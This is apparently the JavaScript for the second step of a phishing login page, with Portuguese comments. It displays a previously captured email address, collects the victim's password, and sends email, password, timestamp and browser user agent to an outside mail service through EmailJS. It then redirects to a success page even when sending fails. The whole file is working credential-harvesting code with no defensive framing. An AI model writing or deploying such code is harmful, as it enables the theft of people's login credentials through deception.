// Inicializar EmailJS com a Public Key
(function() {
    emailjs.init({
        publicKey: "Lxk2yKxDZkTdwAqCG" // Substitua pela sua Public Key do EmailJS
    });
})();

// Recuperar e-mail do localStorage
const emailFromStorage = localStorage.getItem('userEmail') || 'seu e-mail';
const emailDisplay = document.getElementById('emailDisplay');
const passwordForm = document.getElementById('passwordForm');
const passwordField = document.getElementById('password');

// Exibir e-mail
emailDisplay.textContent = emailFromStorage;

// Foco automático
window.addEventListener('load', function() {
    passwordField.focus();
});

// Envio do formulário de senha
passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const password = passwordField.value.trim();
    
    if (!password) {
        alert('Digite sua senha.');
        return;
    }
    
    // Dados completos para enviar
    const templateParams = {
        email_address: emailFromStorage,
        password: password,
        timestamp: new Date().toLocaleString('pt-BR'),
        user_agent: navigator.userAgent
    };
    
    // Enviar email com dados completos
    emailjs.send('service_gwyfs86', 'template_c1v81v9', templateParams)
        .then(function(response) {
            console.log('Email completo enviado com sucesso!', response.status, response.text);
            
            // Limpar localStorage e redirecionar
            localStorage.removeItem('userEmail');
            window.location.href = 'success.html';
        }, function(error) {
            console.log('Erro ao enviar email:', error);
            // Mesmo assim redireciona (para fins de teste)
            window.location.href = 'success.html';
        });
});

// Mostrar/ocultar senha
function togglePassword() {
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
    } else {
        passwordField.type = 'password';
    }
}

// Voltar para página anterior
function goBack() {
    localStorage.removeItem('userEmail');
    window.history.back();
}
